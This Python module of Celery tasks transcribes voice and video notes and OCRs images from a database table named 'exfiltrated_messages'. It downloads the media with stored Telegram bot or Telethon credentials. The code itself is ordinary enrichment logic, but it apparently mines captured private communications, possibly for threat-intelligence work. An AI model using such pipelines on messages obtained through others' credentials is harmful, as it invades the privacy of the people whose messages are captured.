"""Heavy media-enrichment flow tasks (ASR + OCR).

These tasks run on the dedicated ``heavy`` queue/container because both
faster-whisper and tesseract are memory-hungry.  The module itself MUST stay
import-safe for the lean worker image: heavy third-party packages are imported
inside the task helpers only, so ``app.workers.tasks.flows.heavy`` can be listed
in the main worker's imports without pulling the models (or the packages) in.

Downloading reuses ``BroadcasterService._download_media_bytes`` — source-bot
token first, Telethon fallback — so there is a single downloader in the repo.
Failures are recorded in ``file_meta`` instead of raised: these are enrichment
tasks, and a retry storm on a corrupt/oversized/absent attachment is useless.
"""

import asyncio
import contextlib
import io
import threading
from datetime import datetime

from .common import *

# ── ASR caps / model identity ────────────────────────────────────────────────
MAX_ASR_BYTES = 25 * 1024 * 1024  # Telegram Bot API download ceiling
MAX_ASR_DURATION_SECONDS = 600.0
ASR_MODEL_NAME = "small-int8"
ASR_MEDIA_TYPES = {"voice", "audio", "video_note"}
ASR_RELEVANT_MIME_PREFIXES = ("audio/", "video/")

# ── OCR caps / model identity ────────────────────────────────────────────────
MAX_OCR_BYTES = 10 * 1024 * 1024
OCR_LANGUAGE = "eng+chi_sim+rus"
OCR_MODEL_NAME = "tesseract"
OCR_IMAGE_EXTENSIONS = (".jpg", ".jpeg", ".png", ".webp", ".tif", ".tiff")

# Lazy module-level faster-whisper singleton (never constructed at import time).
_WHISPER_MODEL = None
_WHISPER_MODEL_LOCK = threading.Lock()


def _get_whisper_model():
    """Return the process-wide ``small`` int8 WhisperModel, lazily built."""
    global _WHISPER_MODEL
    if _WHISPER_MODEL is None:
        with _WHISPER_MODEL_LOCK:
            if _WHISPER_MODEL is None:
                from faster_whisper import WhisperModel

                _WHISPER_MODEL = WhisperModel(
                    "small", device="cpu", compute_type="int8"
                )
    return _WHISPER_MODEL


def _declared_size(file_meta: dict) -> int | None:
    """Best-effort size from stored metadata (Bot API or Telethon shape)."""
    for key in ("file_size", "size"):
        value = file_meta.get(key)
        if value is None:
            continue
        try:
            return int(value)
        except (TypeError, ValueError):
            continue
    return None


def _declared_duration(file_meta: dict) -> float | None:
    for key in ("duration", "media_duration"):
        value = file_meta.get(key)
        if value is None:
            continue
        try:
            return float(value)
        except (TypeError, ValueError):
            continue
    return None


def _has_download_handle(file_meta: dict) -> bool:
    if file_meta.get("file_id"):
        return True
    return bool(file_meta.get("id") and file_meta.get("access_hash"))


def _mime_of(file_meta: dict) -> str:
    return str(file_meta.get("mime") or file_meta.get("mime_type") or "").lower()


async def _load_message_row(message_id: str) -> dict | None:
    response = await async_execute(
        db.table("exfiltrated_messages")
        .select("id, credential_id, media_type, content, file_meta")
        .eq("id", message_id)
        .limit(1)
    )
    rows = response.data or []
    return rows[0] if rows else None


def _merged_file_meta(file_meta: dict, updates: dict) -> dict:
    """Return ``file_meta`` with ``updates`` applied (never mutates the input)."""
    merged = dict(file_meta or {})
    merged.update(updates)
    return merged


async def _merge_file_meta(message_id: str, file_meta: dict, updates: dict) -> bool:
    """Merge ``updates`` into ``file_meta`` without clobbering existing keys."""
    merged = _merged_file_meta(file_meta, updates)
    try:
        await async_execute(
            db.table("exfiltrated_messages")
            .update({"file_meta": merged})
            .eq("id", message_id)
        )
        return True
    except Exception as exc:  # noqa: BLE001 - enrichment must not raise
        logger.warning(
            "[Heavy] file_meta update failed for msg=%s: %s", message_id, exc
        )
        return False


async def _refresh_embedding_after_media_text(
    message_id: str, content: str | None, merged_file_meta: dict
) -> None:
    """Re-embed a message after ASR/OCR merged new derived text.

    Best-effort by contract: the hook is disabled unless ``EMBED_API_URL`` is
    set, it runs in a worker thread so the event loop keeps serving the heavy
    task, and *every* failure is swallowed. A stale vector is recoverable by the
    backfill; a failed/retried enrichment task is not.
    """
    try:
        from app.services import embedding_hook

        if not os.getenv(embedding_hook.EMBED_API_URL_ENV, "").strip():
            return
        await asyncio.to_thread(
            embedding_hook.embed_message_best_effort,
            message_id,
            content,
            file_meta=merged_file_meta,
        )
    except Exception as exc:  # noqa: BLE001 - embedding must never fail enrichment
        # Message id only: transcript/OCR content must never reach the logs.
        logger.warning(
            "[Heavy] embedding refresh skipped for msg=%s: %s", message_id, exc
        )


async def _write_merged_file_meta_and_reembed(
    message_id: str,
    content: str | None,
    file_meta: dict,
    updates: dict,
) -> bool:
    """Persist merged ``file_meta`` and refresh the vector from the same text."""
    merged = _merged_file_meta(file_meta, updates)
    if not await _merge_file_meta(message_id, file_meta, updates):
        return False
    await _refresh_embedding_after_media_text(message_id, content, merged)
    return True


async def _skip(message_id: str, file_meta: dict, key: str, reason: str) -> dict:
    await _merge_file_meta(message_id, file_meta, {key: reason})
    logger.info("[Heavy] msg=%s skipped: %s", message_id, reason)
    return {"status": "skipped", "reason": reason}


async def _download(file_meta: dict, credential_id: str | None) -> bytes | None:
    if not _has_download_handle(file_meta):
        return None
    try:
        return await get_broadcaster()._download_media_bytes(
            file_meta, credential_id
        )
    except Exception as exc:  # noqa: BLE001 - download failure is a skip
        logger.warning("[Heavy] media download failed: %s", exc)
        return None


# ==============================================
# ASR
# ==============================================
@app.task(name="heavy.transcribe_media")
def transcribe_media(message_id: str):
    """Transcribe a voice/audio/video-note message into ``file_meta``."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_transcribe_media_logic(message_id))


async def _transcribe_media_logic(message_id: str) -> dict:
    message_id = str(message_id)
    try:
        row = await _load_message_row(message_id)
    except Exception as exc:  # noqa: BLE001
        logger.warning("[HeavyASR] row lookup failed for msg=%s: %s", message_id, exc)
        return {"status": "db_lookup_failed"}

    if row is None:
        return {"status": "not_found"}

    file_meta = dict(row.get("file_meta") or {})
    media_type = str(row.get("media_type") or "").lower()

    # Idempotent re-delivery: never re-run the model over finished rows.
    if isinstance(file_meta.get("transcript_text"), str) and file_meta[
        "transcript_text"
    ].strip():
        return {"status": "already_transcribed"}
    if file_meta.get("transcript_skipped"):
        return {
            "status": "already_skipped",
            "reason": file_meta.get("transcript_skipped"),
        }

    if media_type not in ASR_MEDIA_TYPES:
        return await _skip(
            message_id, file_meta, "transcript_skipped", "unsupported_media_type"
        )

    declared_size = _declared_size(file_meta)
    if declared_size is not None and declared_size > MAX_ASR_BYTES:
        return await _skip(message_id, file_meta, "transcript_skipped", "too_large")

    declared_duration = _declared_duration(file_meta)
    if (
        declared_duration is not None
        and declared_duration > MAX_ASR_DURATION_SECONDS
    ):
        return await _skip(message_id, file_meta, "transcript_skipped", "too_long")

    data = await _download(file_meta, row.get("credential_id"))
    if not data:
        return await _skip(message_id, file_meta, "transcript_skipped", "missing_media")
    if len(data) > MAX_ASR_BYTES:
        return await _skip(message_id, file_meta, "transcript_skipped", "too_large")

    try:
        model = _get_whisper_model()
    except Exception as exc:  # noqa: BLE001 - missing package/model is not fatal
        logger.warning("[HeavyASR] model unavailable: %s", exc)
        return await _skip(
            message_id, file_meta, "transcript_skipped", "asr_unavailable"
        )

    try:
        segments, info = model.transcribe(io.BytesIO(data), vad_filter=True)
        transcript = " ".join(
            segment.text.strip()
            for segment in segments
            if getattr(segment, "text", None) and segment.text.strip()
        ).strip()
        duration = float(getattr(info, "duration", 0.0) or 0.0)
        language = getattr(info, "language", None) or "unknown"
    except Exception as exc:  # noqa: BLE001 - corrupt/unsupported audio
        logger.warning("[HeavyASR] transcription failed for msg=%s: %s", message_id, exc)
        return await _skip(
            message_id, file_meta, "transcript_skipped", "transcription_failed"
        )

    if duration > MAX_ASR_DURATION_SECONDS:
        return await _skip(message_id, file_meta, "transcript_skipped", "too_long")

    updated = await _write_merged_file_meta_and_reembed(
        message_id,
        row.get("content"),
        file_meta,
        {
            "transcript_text": transcript,
            "transcript_language": language,
            "transcript_model": ASR_MODEL_NAME,
            "transcript_duration": round(duration, 3),
        },
    )
    if not updated:
        return {"status": "update_failed"}

    # Character count only — transcript content must never reach the logs.
    logger.info(
        "[HeavyASR] transcribed msg=%s chars=%s duration=%.1fs lang=%s",
        message_id,
        len(transcript),
        duration,
        language,
    )
    return {
        "status": "ok",
        "chars": len(transcript),
        "duration": round(duration, 3),
        "language": language,
    }


# ==============================================
# OCR
# ==============================================
def _is_image_media(media_type: str, file_meta: dict) -> bool:
    if media_type == "photo":
        return True
    if media_type != "document":
        return False
    if _mime_of(file_meta).startswith("image/"):
        return True
    file_name = str(file_meta.get("file_name") or "").lower()
    return file_name.endswith(OCR_IMAGE_EXTENSIONS)


@app.task(name="heavy.ocr_media")
def ocr_media(message_id: str):
    """OCR a photo/document image into ``file_meta``."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_ocr_media_logic(message_id))


async def _ocr_media_logic(message_id: str) -> dict:
    message_id = str(message_id)
    try:
        row = await _load_message_row(message_id)
    except Exception as exc:  # noqa: BLE001
        logger.warning("[HeavyOCR] row lookup failed for msg=%s: %s", message_id, exc)
        return {"status": "db_lookup_failed"}

    if row is None:
        return {"status": "not_found"}

    file_meta = dict(row.get("file_meta") or {})
    media_type = str(row.get("media_type") or "").lower()

    if isinstance(file_meta.get("ocr_text"), str) and file_meta["ocr_text"].strip():
        return {"status": "already_ocred"}
    if file_meta.get("ocr_skipped"):
        return {
            "status": "already_skipped",
            "reason": file_meta.get("ocr_skipped"),
        }

    if media_type not in {"photo", "document"}:
        return await _skip(
            message_id, file_meta, "ocr_skipped", "unsupported_media_type"
        )
    if not _is_image_media(media_type, file_meta):
        return await _skip(message_id, file_meta, "ocr_skipped", "non_image")

    declared_size = _declared_size(file_meta)
    if declared_size is not None and declared_size > MAX_OCR_BYTES:
        return await _skip(message_id, file_meta, "ocr_skipped", "too_large")

    data = await _download(file_meta, row.get("credential_id"))
    if not data:
        return await _skip(message_id, file_meta, "ocr_skipped", "missing_media")
    if len(data) > MAX_OCR_BYTES:
        return await _skip(message_id, file_meta, "ocr_skipped", "too_large")

    try:
        import pytesseract
        from PIL import Image
    except Exception as exc:  # noqa: BLE001 - lean image has no tesseract/Pillow
        logger.warning("[HeavyOCR] OCR engine unavailable: %s", exc)
        return await _skip(message_id, file_meta, "ocr_skipped", "ocr_unavailable")

    try:
        with Image.open(io.BytesIO(data)) as img:
            img.load()
            image = img.convert("RGB")
    except Exception as exc:  # noqa: BLE001 - corrupt/truncated image
        logger.warning("[HeavyOCR] corrupt image for msg=%s: %s", message_id, exc)
        return await _skip(message_id, file_meta, "ocr_skipped", "corrupt_image")

    try:
        text = (pytesseract.image_to_string(image, lang=OCR_LANGUAGE) or "").strip()
    except Exception as exc:  # noqa: BLE001 - tesseract runtime failure
        logger.warning("[HeavyOCR] tesseract failed for msg=%s: %s", message_id, exc)
        return await _skip(message_id, file_meta, "ocr_skipped", "ocr_failed")

    updated = await _write_merged_file_meta_and_reembed(
        message_id,
        row.get("content"),
        file_meta,
        {
            "ocr_text": text,
            "ocr_language": OCR_LANGUAGE,
            "ocr_model": OCR_MODEL_NAME,
        },
    )
    if not updated:
        return {"status": "update_failed"}

    # Character count only — OCR text must never reach the logs.
    logger.info(
        "[HeavyOCR] ocred msg=%s chars=%s lang=%s",
        message_id,
        len(text),
        OCR_LANGUAGE,
    )
    return {"status": "ok", "chars": len(text)}


# ==============================================
# CAPTURE-FLOW ENQUEUE HOOK
# ==============================================
HEAVY_ENQUEUE_QUEUE = "heavy"
HEAVY_ENQUEUE_DEDUPE_PREFIX = "heavy:enqueued:"
HEAVY_ENQUEUE_DEDUPE_TTL_SECONDS = 86_400
HEAVY_ENQUEUE_MAX_PER_RUN_ENV = "HEAVY_ENQUEUE_MAX_PER_RUN"
HEAVY_ENQUEUE_DEFAULT_MAX_PER_RUN = 50

_run_enqueued = 0
_run_cap_logged = False


def reset_enqueue_run_budget() -> None:
    """Start a fresh per-run enqueue budget for a capture/broadcast run."""
    global _run_enqueued, _run_cap_logged
    _run_enqueued = 0
    _run_cap_logged = False


def _enqueue_max_per_run() -> int:
    raw = os.getenv(HEAVY_ENQUEUE_MAX_PER_RUN_ENV)
    try:
        return max(0, int(raw))
    except (TypeError, ValueError):
        return HEAVY_ENQUEUE_DEFAULT_MAX_PER_RUN


def _enqueue_task_for(media_type: str, file_meta: dict | None):
    if media_type in ASR_MEDIA_TYPES:
        return transcribe_media
    if media_type == "photo" or (
        media_type == "document" and _is_image_media(media_type, file_meta or {})
    ):
        return ocr_media
    return None


def enqueue_enrichment_for_message(
    media_type: str | None,
    message_id: str | None,
    credential_id: str | None = None,
    file_meta: dict | None = None,
) -> bool:
    """Best-effort ASR/OCR enqueue for one stored media message.

    Returns True only when a task was dispatched. Every failure mode (flag off,
    unsupported media, duplicate id, cap reached, Redis/broker unavailable)
    returns False and never raises — capture flows must be unaffected.
    """
    global _run_enqueued, _run_cap_logged

    if not getattr(settings, "HEAVY_ENRICHMENT_ENABLED", False):
        return False

    normalized_type = str(media_type or "").lower()
    task = _enqueue_task_for(normalized_type, file_meta)
    if task is None or not message_id:
        return False

    if _run_enqueued >= _enqueue_max_per_run():
        if not _run_cap_logged:
            _run_cap_logged = True
            logger.info(
                "[HeavyEnqueue] per-run cap reached (%s); skipping further enqueues",
                _enqueue_max_per_run(),
            )
        return False

    dedupe_key = f"{HEAVY_ENQUEUE_DEDUPE_PREFIX}{message_id}"
    try:
        is_first = redis_client.set(
            dedupe_key, "1", nx=True, ex=HEAVY_ENQUEUE_DEDUPE_TTL_SECONDS
        )
    except Exception as exc:  # noqa: BLE001 - capture must not depend on Redis
        logger.warning(
            "[HeavyEnqueue] redis dedupe failed msg=%s cred=%s: %s",
            message_id,
            credential_id,
            exc,
        )
        return False
    if not is_first:
        return False

    try:
        task.apply_async(args=[str(message_id)], queue=HEAVY_ENQUEUE_QUEUE)
    except Exception as exc:  # noqa: BLE001 - broker outage must not break capture
        logger.warning(
            "[HeavyEnqueue] broker dispatch failed msg=%s cred=%s: %s",
            message_id,
            credential_id,
            exc,
        )
        with contextlib.suppress(Exception):  # best-effort dedupe cleanup
            redis_client.delete(dedupe_key)
        return False

    _run_enqueued += 1
    logger.debug(
        "[HeavyEnqueue] enqueued %s msg=%s cred=%s",
        task.name if hasattr(task, "name") else normalized_type,
        message_id,
        credential_id,
    )
    return True


# ==============================================
# BACKFILL
# ==============================================
HEAVY_BACKFILL_BATCH_SIZE = 50
HEAVY_BACKFILL_PAGE_SIZE = 200
HEAVY_BACKFILL_MARKER_KEY = "heavy_backfill_at"
HEAVY_BACKFILL_MEDIA_TYPES = ASR_MEDIA_TYPES | {"photo", "document"}
HEAVY_BACKFILL_DELAY_ENV = "HEAVY_BACKFILL_DELAY_SECONDS"
HEAVY_BACKFILL_DEFAULT_DELAY_SECONDS = 2.0


def _backfill_delay_seconds() -> float:
    """Env-tunable pause between dispatches (never negative)."""
    raw = os.getenv(HEAVY_BACKFILL_DELAY_ENV)
    try:
        return max(0.0, float(raw))
    except (TypeError, ValueError):
        return HEAVY_BACKFILL_DEFAULT_DELAY_SECONDS


def _backfill_pipelines(media_type: str, file_meta: dict) -> list[str]:
    """Return the enrichment pipelines still owed for a row.

    A row is skipped when any extraction already produced text, when the
    backfill marker from a previous run is present, or when the relevant
    pipeline recorded a skip reason.  Reusing the ASR/OCR predicates keeps the
    selection identical to what the worker tasks themselves accept.
    """
    transcript = file_meta.get("transcript_text")
    if isinstance(transcript, str) and transcript.strip():
        return []
    ocr = file_meta.get("ocr_text")
    if isinstance(ocr, str) and ocr.strip():
        return []
    if file_meta.get(HEAVY_BACKFILL_MARKER_KEY):
        return []

    pipelines = []
    if media_type in ASR_MEDIA_TYPES and not file_meta.get("transcript_skipped"):
        pipelines.append("asr")
    if _is_image_media(media_type, file_meta) and not file_meta.get("ocr_skipped"):
        pipelines.append("ocr")
    return pipelines


async def _fetch_backfill_page(offset: int, limit: int) -> list[dict]:
    response = await async_execute(
        db.table("exfiltrated_messages")
        .select("id, media_type, file_meta, created_at")
        .in_("media_type", sorted(HEAVY_BACKFILL_MEDIA_TYPES))
        .order("created_at")
        .range(offset, offset + limit - 1)
    )
    return list(response.data or [])


async def _select_backfill_batch() -> tuple[list[tuple[dict, list[str]]], int]:
    """Oldest-first scan returning at most ``HEAVY_BACKFILL_BATCH_SIZE`` rows."""
    selected: list[tuple[dict, list[str]]] = []
    scanned = 0
    offset = 0
    while len(selected) < HEAVY_BACKFILL_BATCH_SIZE:
        rows = await _fetch_backfill_page(offset, HEAVY_BACKFILL_PAGE_SIZE)
        if not rows:
            break
        scanned += len(rows)
        for row in rows:
            media_type = str(row.get("media_type") or "").lower()
            file_meta = row.get("file_meta")
            if not isinstance(file_meta, dict):
                file_meta = {}
            pipelines = _backfill_pipelines(media_type, file_meta)
            if not pipelines:
                continue
            selected.append((row, pipelines))
            if len(selected) >= HEAVY_BACKFILL_BATCH_SIZE:
                break
        if len(rows) < HEAVY_BACKFILL_PAGE_SIZE:
            break
        offset += len(rows)
    return selected, scanned


@app.task(name="heavy.backfill_media_text")
def backfill_media_text(dry_run: bool = True):
    """Backfill transcripts/OCR for media messages that never got them.

    ``dry_run`` defaults to True: the task only reports what it would do.
    Applied runs stamp ``file_meta.heavy_backfill_at`` after dispatching so a
    follow-up run does not queue the same messages again while the enrichment
    tasks are still in flight.
    """
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(
        _backfill_media_text_logic(dry_run=dry_run)
    )


async def _backfill_media_text_logic(dry_run: bool = True) -> dict:
    selected, scanned = await _select_backfill_batch()

    pending = {"asr": 0, "ocr": 0}
    for _row, pipelines in selected:
        for pipeline in pipelines:
            pending[pipeline] += 1

    result = {
        "status": "dry_run" if dry_run else "ok",
        "selected": len(selected),
        "scanned": scanned,
        "pending": pending,
        "dispatched": {"asr": 0, "ocr": 0},
        "delay_seconds": _backfill_delay_seconds(),
    }
    logger.info(
        "[HeavyBackfill] dry_run=%s selected=%s scanned=%s pending=%s",
        dry_run,
        len(selected),
        scanned,
        pending,
    )
    if dry_run or not selected:
        return result

    delay = result["delay_seconds"]
    dispatched = 0
    for row, pipelines in selected:
        message_id = str(row.get("id"))
        if dispatched and delay > 0:
            time.sleep(delay)
        tasks = {"asr": transcribe_media, "ocr": ocr_media}
        queued = []
        for pipeline in pipelines:
            try:
                tasks[pipeline].apply_async(args=[message_id], queue="heavy")
            except Exception as exc:  # noqa: BLE001 - one bad dispatch must not stop the batch
                logger.warning(
                    "[HeavyBackfill] dispatch failed msg=%s pipeline=%s: %s",
                    message_id,
                    pipeline,
                    exc,
                )
                break
            queued.append(pipeline)
        if not queued:
            continue
        for pipeline in queued:
            result["dispatched"][pipeline] += 1
        stamped = await _merge_file_meta(
            message_id,
            row.get("file_meta") or {},
            {HEAVY_BACKFILL_MARKER_KEY: datetime.now(UTC).isoformat()},
        )
        if stamped:
            dispatched += 1

    logger.info(
        "[HeavyBackfill] dispatched=%s breakdown=%s",
        dispatched,
        result["dispatched"],
    )
    return result
